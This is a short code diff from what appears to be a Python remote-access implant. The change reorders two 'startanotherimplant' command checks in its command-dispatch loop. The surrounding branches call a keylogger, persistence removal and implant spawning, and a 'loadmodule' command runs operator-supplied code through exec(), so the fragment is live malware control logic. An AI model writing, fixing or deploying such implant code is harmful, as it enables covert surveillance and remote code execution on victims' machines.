@@ -139,10 +139,10 @@ while(True):
               returnval = keylog()
             elif cmd[:18] == "remove-persistence":
               returnval = remove_persist()
-            elif cmd[:19] == "startanotherimplant":
-              returnval = sai(delfile=True)
             elif cmd[:28] == "startanotherimplant-keepfile":
               returnval = sai()
+            elif cmd[:19] == "startanotherimplant":
+              returnval = sai(delfile=True)
             elif cmd[:10] == "loadmodule":
               module = cmd.replace("loadmodule","")
               exec(module)
